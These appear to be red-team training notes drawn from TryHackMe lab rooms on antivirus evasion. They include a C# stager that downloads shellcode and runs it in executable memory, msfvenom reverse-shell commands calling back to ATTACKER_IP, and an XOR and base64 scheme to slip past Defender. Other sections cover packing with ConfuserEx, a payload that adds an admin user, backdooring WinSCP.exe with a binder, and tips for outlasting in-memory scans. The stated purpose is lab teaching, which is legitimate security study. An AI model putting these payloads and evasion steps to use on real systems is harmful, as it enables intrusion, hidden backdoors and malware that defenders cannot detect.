  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,
  0x00
};
unsigned int _tmp_example_bin_len = 193;
```

If we compare the output with the previous shellcode created with Metasploit, it matches.

Staged Payloads

In our goal to bypass the AV,
 we will find two main approaches to delivering the final shellcode to a
 victim. Depending on the method, you will find payloads are usually 
categorized as **staged** or **stageless** payloads. In this task, we will look at the differences in both approaches and the advantages of each method.

# Stageless Payloads

A stageless payload embeds the final shellcode directly into itself. 
Think of it as a packaged app that executes the shellcode in a 
single-step process. In previous tasks, we embedded an executable that 
embedded a simple `calc` shellcode, making a stageless payload.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/cad28e045fd6fec615b04d731aef7f9a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/cad28e045fd6fec615b04d731aef7f9a.png)

In
 the example above, when the user executes the malicious payload, the 
embedded shellcode will run, providing a reverse shell to the attacker.

# Staged Payloads

Staged payloads work by using intermediary shellcodes that act as 
steps leading to the execution of a final shellcode. Each of these 
intermediary shellcodes is known as a **stager**, and its primary goal is to provide a means to retrieve the final shellcode and execute it eventually.

While there might be payloads with several stages, the usual case 
involves having a two-stage payload where the first stage, which we'll 
call **stage0**, is a stub shellcode that will connect back to the attacker's machine to download the final shellcode to be executed.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f92f294a9e599967a0961b4273381be6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f92f294a9e599967a0961b4273381be6.png)

Once
 retrieved, the stage0 stub will inject the final shellcode somewhere in
 the memory of the payload's process and execute it (as shown below).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/fd8a98b3cb79cca98a1e0dfd0292ea61.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/fd8a98b3cb79cca98a1e0dfd0292ea61.png)

# Staged vs. Stageless

When deciding which type of payload to use, we must be aware of the 
environment we'll be attacking. Each payload type has advantages and 
disadvantages depending on the specific attack scenario.

In the case of stageless payloads, you will find the following advantages:

- The resulting executable packs all that is needed to get our shellcode working.
- The payload will execute without requiring additional network connections.
The fewer the network interactions, the lesser your chances of being
detected by an IPS.
- If you are attacking a host with very restricted network connectivity, you may want your whole payload to be in a single package.

For staged payloads, you will have:

- Small footprint on
disk. Since stage0 is only in charge of downloading the final shellcode, it will most likely be small in size.
- The final shellcode isn't embedded into the executable. If your payload is captured, the Blue Team will only have access to the stage0 stub and nothing more.
- The final shellcode is loaded in memory and never touches the disk. This makes it less prone to be detected by AV solutions.
- You can reuse the same stage0 dropper for many shellcodes, as you can
simply replace the final shellcode that gets served to the victim
machine.

In conclusion, we can't say that either type is better than the other
 unless we add some context to it. In general, stageless payloads are 
better suited for networks with lots of perimeter security, as it 
doesn't rely on having to download the final shellcode from the 
Internet. If, for example, you are performing a USB Drop Attack to 
target computers in a closed network environment where you know you 
won't get a connection back to your machine, stageless is the way to go.

Staged payloads, on the other hand, are great when you want 
your footprint on the local machine to be reduced to a minimum. Since 
they execute the final payload in memory, some AV
 solutions might find it harder to detect them. They are also great for 
avoiding exposing your shellcodes (which usually take considerable time 
to prepare), as the shellcode isn't dropped into the victim's disk at 
any point (as an artifact).

# Stagers in

When creating payloads with msfvenom or using them directly in Metasploit,
 you can choose to use either staged or stageless payloads. As an 
example, if you want to generate a reverse TCP shell, you will find two 
payloads exist for that purpose with slightly different names (notice 
the `_` versus `/` after `shell`):

| **Payload** | **Type** |
| --- | --- |
| windows/x64/shell_reverse_tcp | Stageless payload |
| windows/x64/shell/reverse_tcp | Staged payload |

You will generally find that the same name patterns are applied to other types of shells. To use a stageless Meterpreter, for example, we would use the `windows/x64/meterpreter_reverse_tcp`, rather than `windows/x64/meterpreter/reverse_tcp`, which works as its staged counterpart.

# Creating Your Own Stager

To create a staged payload, we will use a slightly modified version of the stager code provided by [@mvelazc0](https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs). The full code of our stager can be obtained here, but is also available in your Windows machine at `C:\Tools\CS Files\StagedPayload.cs`:

*Full Payload Code (Click to read)*

The code may look intimidating at first but is relatively straightforward. Let's analyze what it does step by step.

The first part of the code will import some Windows API functions via P/Invoke. The functions we need are the following three from `kernel32.dll`:

| **WinAPI Function** | **Description** |
| --- | --- |
| [VirtualAlloc()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) | Allows us to reserve some memory to be used by our shellcode. |
| [CreateThread()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) | Creates a thread as part of the current process. |
| [WaitForSingleObject()](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) | Used for thread synchronization. It allows us to wait for a thread to finish before continuing. |

The part of the code in charge of importing these functions is the following:

```csharp
//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

The most significant part of our code will be in the `Stager()`
 function, where the stager logic will be implemented. The Stager 
function will receive a URL from where the shellcode to be executed will
 be downloaded.

The first part of the `Stager()` function will create a new `WebClient()` object that allows us to download the shellcode using web requests. Before making the actual request, we will overwrite the `ServerCertificateValidationCallback`
 method in charge of validating SSL certificates when using HTTPS 
requests so that the WebClient doesn't complain about self-signed or 
invalid certificates, which we will be using in the web server hosting 
the payloads. After that, we will call the `DownloadData()` method to download the shellcode from the given URL and store it into the `shellcode` variable:

```csharp
WebClient wc = new WebClient();
ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

byte[] shellcode = wc.DownloadData(url);
```

Once our shellcode is downloaded and available in the `shellcode` variable, we'll need to copy it into executable memory before actually running it. We use `VirtualAlloc()` to request a memory block from the operating system. Notice that we request enough memory to allocate `shellcode.Length` bytes, and set the `PAGE_EXECUTE_READWRITE`
 flag, making the assigned memory executable, readable and writable. 
Once our executable memory block is reserved and assigned to the `codeAddr` variable, we use `Marshal.Copy()` to copy the contents of the `shellcode` variable in the `codeAddr` variable.

```csharp
UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
```

Now that we have a copy of the shellcode allocated in a block of executable memory, we use the `CreateThread()`
 function to spawn a new thread on the current process that will execute
 our shellcode. The third parameter passed to CreateThread points to `codeAddr`,
 where our shellcode is stored, so that when the thread starts, it runs 
the contents of our shellcode as if it were a regular function. The 
fifth parameter is set to 0, meaning the thread will start immediately.

Once the thread has been created, we will call the `WaitForSingleObject()` function
 to instruct our current program that it has to wait for the thread 
execution to finish before continuing. This prevents our program from 
closing before the shellcode thread gets a chance to execute:

```csharp
IntPtr threadHandle = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr parameter = IntPtr.Zero;
threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

WaitForSingleObject(threadHandle, 0xFFFFFFFF);
```

To compile the code, we suggest copying 
it into a Windows machine as a file called staged-payload.cs and 
compiling it with the following command:

PowerShell

```
PS C:\> csc staged-payload.cs
```

# Using our stager to run a reverse shell

Once our payload is compiled, we will need to set up a web server to 
host the final shellcode. Remember that our stager will connect to this 
server to retrieve the shellcode and execute it in the victim machine 
in-memory. Let's start by generating a shellcode (the name of the file 
needs to match the URL in our stager):

AttackBox

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
```

Notice that we are using the raw format for our shellcode, as the stager will directly load whatever it downloads into memory.

Now that we have a shellcode, let's set up a simple HTTPS server. 
First, we will need to create a self-signed certificate with the 
following command:

AttackBox

```
user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```

You will be asked for some information, but feel free to press enter 
for any requested information, as we don't need the SSL certificate to 
be valid. Once we have an SSL certificate, we can spawn a simple HTTPS 
server using python3 with the following command:

AttackBox

```
user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

With all of this ready, we can now execute our stager payload. The 
stager should connect to the HTTPS server and retrieve the shellcode.bin
 file to load it into memory and run it on the victim machine. Remember 
to set up an nc listener to receive the reverse shell on the same port 
specified when running msfvenom:

AttackBox

```
user@AttackBox$ nc -lvp 7474
```

**Introduction to Encoding and Encryption**

# What is Encoding?

Encoding
 is the process of changing the data from its original state into a 
specific format depending on the algorithm or type of encoding. It can 
be applied to many data types such as videos, HTML, URLs, and binary 
files (EXE, Images, etc.).

Encoding is an important concept that is commonly used for various purposes, including but not limited to:

- Program compiling and execution
- Data storage and transmission
- Data processing such as file conversion

Similarly, when it comes to AV
 evasion techniques, encoding is also used to hide shellcode strings 
within a binary. However, encoding is not enough for evasion purposes. 
Nowadays, AV software is more intelligent and can analyze a binary, and 
once an encoded string is found, it is decoded to check the text's 
original form.

You can also use two or more encoding algorithms in tandem to make it harder for the AV
 to figure out the hidden content. The following figure shows that we 
converted the "THM" string into hexadecimal representation and then 
encoded it using Base64. In this case, you need to make sure that your 
dropper now handles such encoding to restore the string to its original 
state.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6b3d06034f60f472a3c3620815d25be1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6b3d06034f60f472a3c3620815d25be1.png)

# What is Encryption?

Encryption
 is one of the essential elements of information and data security which
 focuses on preventing unauthorized access and manipulation of data. The
 encryption process involves converting plaintext (unencrypted content) 
into an encrypted version called Ciphertext. The Ciphertext can't be 
read or decrypted without knowing the algorithm used in encryption as 
well as the key.

Like encoding, encryption techniques are used for
 various purposes, such as storing and transmitting data securely, as 
well as end-to-end encryption. Encryption can be used in two ways: 
having a shared key between two parties or using public and private 
keys.

For more information about encryption, we encourage you to check [Encryption - Crypto 101](https://tryhackme.com/room/encryptioncrypto101) room.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7cd2d23f048dd314a46910fb29c9836f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7cd2d23f048dd314a46910fb29c9836f.png)

# Why do we Need to Know About Encoding and Encryption?

AV
 vendors implement their AV software to blocklist most public tools 
(such as Metasploit and others) using static or dynamic detection 
techniques. Therefore, without modifying the shellcode generated by these public tools, the detection rate for your dropper is high.

Encoding and encryption can be used in AV
 evasion techniques where we encode and/or encrypt shellcode used in a 
dropper to hide it from AV software during the runtime. Also, the two 
techniques can be used not only to hide the shellcode but also 
functions, variables, etc. In this room, we mainly focus on encrypting 
the shellcode to evade Windows Defender.

**Shellcode Encoding and Encryption**

# Encode using MSFVenom

Public Tools such as Metasploit
 provide encoding and encryption features. However, AV vendors are aware
 of the way these tools build their payloads and take measures to detect
 them. If you try using such features out of the box, chances are your 
payload will be detected as soon as the file touches the victim's disk.

Let's generate a simple payload with this method to prove that point. First of all, you can list all of the encoders available to msfvenom with the following command:

Listing Encoders within the Metasploit Framework

```
user@AttackBox$ msfvenom --list encoders | grep excellent    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```

We can indicate we want to use the `shikata_ga_nai` encoder with the `-e`(encoder) switch and then specify we want to encode the payload three times with the `-i` (iterations) switch:

Encoding using the Metasploit Framework (Shikata_ga_nai)

```
user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharpFound 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai chosen with final size 422
Payload size: 422 bytes
Final size of csharp file: 2170 bytes
```

If we try uploading our newly generated payload to our test machine, the AV will instantly flag it before we even get a chance to execute it:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/747c69e737c96044123329c47845f659.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/747c69e737c96044123329c47845f659.png)

If
 encoding doesn't work, we can always try encrypting the payload. 
Intuitively, we would expect this to have a higher success rating, as 
decrypting the payload should prove a harder task for the AV. Let's try that now.

# Encryption using MSFVenom

You can easily generate encrypted payloads using msfvenom. The 
choices for encryption algorithms are, however, a bit scarce. To list 
the available encryption algorithms, you can use the following command:

Listing encryption modules within the Metasploit Framework

```
user@AttackBox$ msfvenom --list encryptFramework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor
```

Let's build an XOR encrypted payload. For this type of algorithm, you will need to specify a key. The command would look as follows:

Xoring Shellcode using the Metasploit Framework

```
user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: xored-revshell.exe
```

Once again, if we upload the resulting shell to the THM Antivirus Check! page at `http://MACHINE_IP/`, it will still be flagged by the AV. The reason is still that AV vendors have invested lots of time into ensuring simple msfvenom payloads are detected.

# Creating a Custom Payload

The best way to overcome this is to use our own custom encoding schemes so that the AV
 doesn't know what to do to analyze our payload. Notice you don't have 
to do anything too complex, as long as it is confusing enough for the AV
 to analyze. For this task, we will take a simple reverse shell 
generated by msfvenom and use a combination of XOR and Base64 to bypass 
Defender.

Let's start by generating a reverse shell with msfvenom in CSharp format:

Generate a CSharp shellcode Format

```
user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

# The Encoder

Before building our actual payload, we will create a program that 
will take the shellcode generated by msfvenom and encode it in any way 
we like. In this case, we will be XORing the payload with a custom key 
first and then encoding it using base64. Here's the complete code for 
the encoder (you can also find this code in your Windows machine at 
C:\Tools\CS Files\Encryptor.cs):

*Full Payload Code (Click to read)*

The code is pretty straightforward and will generate an encoded 
payload that we will embed on the final payload. Remember to replace the
 `buf` variable with the shellcode you generated with msfvenom.

To compile and execute the encoder, we can use the following commands on the Windows machine:

Compiling and running our custom CSharp encoder

```
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
```

# Self-decoding Payload

Since
 we have an encoded payload, we need to adjust our code so that it 
decodes the shellcode before executing it. To match the encoder, we will
 decode everything in the reverse order we encoded it, so we start by 
decoding the base64 content and then continue by XORing the result with 
the same key we used in the encoder. Here's the full payload code (you 
can also get it in your Windows machine at `C:\Tools\CS Files\EncStageless.cs`):

*Full Payload Code (Click to read)*

Note that we have merely combined a couple of really simple techniques that were detected when used separately. Still, the AV won't complain about the payload this time, as the combination of both methods is not something it can analyze directly.

Let's compile our payload with the following command on the Windows machine:

Compile Our Encrypted Payload

```
C:\> csc.exe EncStageless.cs
```

Before running our payload, let's set up an `nc` listener. After copying and executing our payload into the victim machine, we should get a connection back as expected:

Set Up nc Listener

```
user@AttackBox$ nc -lvp 443Listening on [0.0.0.0] (family 0, port 443)
Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```

As you can see, simple adjustments are enough sometimes. Most of the 
time, any specific methods you find online won't probably work out of 
the box as detection signatures may already exist for them. However, 
using a bit of imagination to customize any method could prove enough 
for a successful bypass.

**Packers**

Another method to defeat disk-based AV detection is to use a packer. **Packers**
 are pieces of software that take a program as input and transform it so
 that its structure looks different, but their functionality remains 
exactly the same. Packers do this with two main goals in mind:

- Compress the program so that it takes up less space.
- Protect the program from reverse engineering in general.

Packers
 are commonly used by software developers who would like to protect 
their software from being reverse engineered or cracked. They achieve 
some level of protection by implementing a mixture of transforms that 
include compressing, encrypting, adding debugging protections and many 
others. As you may have already guessed, packers are also commonly used 
to obfuscate malware without much effort.

There's quite a large number of packers out there, including UPX, MPRESS, Themida, and many others.

# Packing an application

While every packer operates differently, let's look at a basic example of what a simple packer would do.

When an application is packed, it will be transformed in some way using a **packing**
 function. The packing function needs to be able to obfuscate and 
transform the original code of the application in a way that can be 
reasonably reversed by an **unpacking** function so that 
the original functionality of the application is preserved. While 
sometimes the packer may add some code (to make debugging the 
application harder, for example), it will generally want to be able to 
get back the original code you wrote when executing it.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9aacb2fab2a656ffc82a7b0344918062.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9aacb2fab2a656ffc82a7b0344918062.png)

The packed version of the application will contain your packed 
application code. Since this new packed code is obfuscated, the 
application needs to be able to unpack the original code from it. To 
this end, the packer will embed a code stub that contains an unpacker 
and redirect the main entry point of the executable to it.

When your packed application gets executed, the following will happen:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/408fb909374c2b54bebef9809eaa417a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/408fb909374c2b54bebef9809eaa417a.png)

1. The unpacker gets executed first, as it is the executable's entry point.
2. The unpacker reads the packed application's code.
3. The unpacker will write the original unpacked code somewhere in memory and direct the execution flow of the application to it.

# Packers

By now, we can see how packers help bypass AV
 solutions. Let's say you built a reverse shell executable, but the AV 
is catching it as malicious because it matches a known signature. In 
this case, using a packer will transform the reverse shell executable so
 that it doesn't match any known signatures while on disk. As a result, 
you should be able to distribute your payload to any machine's disk 
without much problem.

AV solutions, however, could still catch your packed application for a couple of reasons:

- While your original code might be transformed into something
unrecognizable, remember that the packed executable contains a stub with the unpacker's code. If the unpacker has a known signature, AV solutions might still flag any packed executable based on the unpacker stub alone.
- At some point, your application will unpack the original code into memory so that it can be executed. If the AV solution you are trying to bypass can do in-memory scans, you might still be detected after your code is unpacked.

# Packing our shellcode

Let's start from a basic C# shellcode. You can also find this code in your Windows machine at `C:\Tools\CS Files\UnEncStagelessPayload.cs`:

*Full Payload Code (Click to read)*

This payload takes a shellcode generated by msfvenom and runs it into
 a separate thread. For this to work, you'll need to generate a new 
shellcode and put it into the `shellcode` variable of the code:

Command Prompt

```
C:\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp
```

You can then compile your payload in the Windows machine using the following command:

Command Prompt

```
C:\> csc UnEncStagelessPayload.cs
```

Once you have a working executable, you can try uploading it to the THM
 Antivirus Check! page (link on the desktop). It should be flagged by 
the AV immediately. Let's use a packer on the same payload and see what 
happens.

We will use the [ConfuserEx](https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0) packer for this task, as our payloads are programmed on `.NET`. For your convenience, you can find a shortcut on your desktop to it.

ConfuserEx will require you to indicate the folders in which it will 
work. Be sure to select your desktop as the base directory, as shown in 
the image below. Once the base directory is set up, drag and drop the 
executable you want to pack on the interface, and you should end up with
 the following:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9214df2a88ffffbf8561502aa19a375c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9214df2a88ffffbf8561502aa19a375c.png)

Let's go to the settings tab and select our payload. Once selected, 
hit the "+" button to add settings to your payload. This should create a
 rule named "true". Make sure to enable compression as well:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/857e5540e14f4ebf743fbd4d2f8ee503.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/857e5540e14f4ebf743fbd4d2f8ee503.png)

We will now edit the "true" rule and set it to the Maximum preset:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/96946f1aff585a91e78408b96e446ea4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/96946f1aff585a91e78408b96e446ea4.png)

Finally, we will go to the "Protect!" tab and hit "Protect":

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e0e3ca97245641d3954f26fa986aae87.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e0e3ca97245641d3954f26fa986aae87.png)

The new payload should be ready and hopefully won't trigger any alarms when uploaded to the THM Antivirus Checker! (shortcut available on your desktop). In fact, if you execute your payload and set up an `nc` listener, you should be able to get a shell back:

AttackBox

```
user@attackbox$ nc -lvp 7478
```

So far, so good, but remember we talked about AVs
 doing in-memory scanning? If you try running a command on your reverse 
shell, the AV will notice your shell and kill it. This is because 
Windows Defender will hook certain Windows API calls and do in-memory 
scanning whenever such API calls are used. In the case of any shell 
generated with msfvenom, CreateProcess() will be invoked and detected.

# So what do we do now?

While defeating in-memory scanning is out of the scope of this room, 
there are a couple of simple things you can do to avoid detection:

- **Just wait a bit**. Try spawning the reverse shell again and wait for around 5 minutes before sending any command. You'll see the AV won't complain anymore. The reason for this is that scanning memory is
an expensive operation. Therefore, the AV will do it for a while after
your process starts but will eventually stop.
- **Use smaller payloads**. The smaller the
payload, the less likely it is to be detected. If you use msfvenom to
get a single command executed instead of a reverse shell, the AV will have a harder time detecting it. You can try with `msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp` and see what happens.

If detection isn't an issue, you can even use a simple trick. From your reverse shell, run `cmd.exe` again. The AV will detect your payload and kill the associated process, but not the new cmd.exe you just spawned.

While every single AV
 will behave differently, most of the time, there will be a similar way 
around them, so it's worth exploring any weird behaviors you notice 
while testing.

**Binders**

While not an AV bypass method, binders are also important when designing a malicious payload to be distributed to end users. A **binder**
 is a program that merges two (or more) executables into a single one. 
It is often used when you want to distribute your payload hidden inside 
another known program to fool users into believing they are executing a 
different program.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5c72d80a077a1f8a813a70c01a6561e9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5c72d80a077a1f8a813a70c01a6561e9.png)

While every single binder might work slightly differently, they will 
basically add the code of your shellcode inside the legitimate program 
and have it executed somehow.

You could, for example, change the entry point in the PE
 header so that your shellcode executes right before the program and 
then redirect the execution back to the legitimate program once it is 
finished. This way, when the user clicks the resulting executable, your 
shellcode will get silently executed first and continue running the 
program normally without the user noticing it.

# Binding with msfvenom

You can easily plant a payload of your preference in any .exe file with `msfvenom`.
 The binary will still work as usual but execute an additional payload 
silently. The method used by msfvenom injects your malicious program by 
creating an extra thread for it, so it is slightly different from what 
was mentioned before but achieves the same result. Having a separate 
thread is even better since your program won't get blocked in case your 
shellcode fails for some reason.

For this task, we will be backdooring the WinSCP executable available at `C:\Tools\WinSCP`.

To create a backdoored WinSCP.exe we can use the following command on our Windows machine:

**Note:** Metasploit
 is installed in the Windows machine for your convenience, but it might 
take up to three minutes to generate the payload (the produced warnings 
can be safely ignored).

AttackBox

```
C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```

The resulting WinSCP-evil.exe will execute a reverse_tcp meterpreter 
payload without the user noticing it. Before anything else, remember to 
set up an `nc` listener to receive the reverse shell. When
 you execute your backdoored executable, it should launch a reverse 
shell back at you while continuing to execute WinSCP.exe for the user:

[Untitled Database](RED%20TEAM%2025cf053835f549b2ae79880b94374008/Untitled%20Database%209c74d6c100d949c3a4fede01fe5752ac.csv)

# Binders and

Binders won't do much to hide your payload from an AV
 solution. The simple fact of joining two executables without any 
changes means that the resulting executable will still trigger any 
signature that the original payload did.

The main use of binders is to fool users into believing they are 
executing a legitimate executable rather than a malicious payload.

When creating a real payload, you may want to use encoders, crypters,
 or packers to hide your shellcode from signature-based AVs and then 
bind it into a known executable so that the user doesn't know what is 
being executed.

Feel free to try and upload your bound executable to the THM
 Antivirus Check website (link available on your desktop) without any 
packing, and you should get a detection back from the server, so this 
method won't be of much help when trying to get the flag from the server
 by itself.

## **OBFUSCATION PRINCIPLES**

**Origins of Obfuscation**

Obfuscation is widely used in many software-related fields to protect **IP** (**I**ntellectual **P**roperty) and other proprietary information an application may contain.

For example, the popular game: Minecraft uses the obfuscator [ProGuard](https://github.com/Guardsquare/proguard) to obfuscate and minimize its Java classes. Minecraft also releases **obfuscation maps**
 with limited information as a translator between the old un-obfuscated 
classes and the new obfuscated classes to support the modding community.

This is only one example of the wide range of ways obfuscation is
 publicly used. To document and organize the variety of obfuscation 
methods, we can reference the [Layered obfuscation: a taxonomy of software obfuscation techniques for layered security paper](https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf). This research paper organizes obfuscation methods by **layers**,
 similar to the OSI model but for application data flow. Below is the 
figure used as the complete overview of each taxonomy layer.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/54c0a2415cd4fc88a55b154bf297910c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/54c0a2415cd4fc88a55b154bf297910c.png)

Each sub-layer is then broken down into specific methods that can achieve the overall objective of the sub-layer.

In this room, we will primarily focus on the **code-element layer** of the taxonomy, as seen in the figure below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/974cf87ce312e0885e6e8027f9c1821e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/974cf87ce312e0885e6e8027f9c1821e.png)

To
 use the taxonomy, we can determine an objective and then pick a method 
that fits our requirements. For example, suppose we want to obfuscate 
the layout of our code but cannot modify the existing code. In that 
case, we can inject junk code, summarized by the taxonomy:

`Code Element Layer` > `Obfuscating Layout` > `Junk Codes`.

But how could this be used maliciously? Adversaries and malware 
developers can leverage obfuscation to break signatures or prevent 
program analysis. In the upcoming tasks, we will discuss both 
perspectives of malware obfuscation, including the purpose and 
underlying techniques of each.

**Obfuscation's Function for Static Evasion**

Two of the more considerable security boundaries in the way of an adversary are **anti-virus engines** and **EDR** (**E**ndpoint **D**etection & **R**esponse) solutions. As covered in the [Introduction to Anti-virus room](https://tryhackme.com/room/introtoav), both platforms will leverage an extensive database of known signatures referred to as **static** signatures as well as **heuristic** signatures that consider application behavior.

To evade signatures, adversaries can leverage an extensive range 
of logic and syntax rules to implement obfuscation. This is commonly 
achieved by abusing data obfuscation practices that hide important 
identifiable information in legitimate applications.

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer. Below is a table of methods covered by the taxonomy in the **obfuscating data** sub-layer**.**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/dacc392986614d70d6dc982111077063.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/dacc392986614d70d6dc982111077063.png)

| **Obfuscation Method** | **Purpose** |
| --- | --- |
| Array Transformation | Transforms an array by splitting, merging, folding, and flattening |
| Data Encoding | Encodes data with mathematical functions or ciphers |
| Data Procedurization | Substitutes static data with procedure calls |
| Data Splitting/Merging | Distributes information of one variable into several new variables |

In the upcoming tasks, we will primarily focus on **data splitting/merging**; because static signatures are weaker, we generally only need to focus on that one aspect in initial obfuscation.

Check out the Encoding/Packing/Binder/Crypters room for more information about **data encoding,** and the [Signature Evasion room](https://tryhackme.com/room/signatureevasion) for more information about **data procedurization** and **transformation**.

**Object Concatenation**

**Concatenation** is a common programming concept that combines two separate objects into one object, such as a string.

A pre-defined operator defines where the concatenation will occur to 
combine two independent objects. Below is a generic example of string 
concatenation in Python.

```python
>>> A = "Hello "
>>> B = "THM"
>>> C = A + B
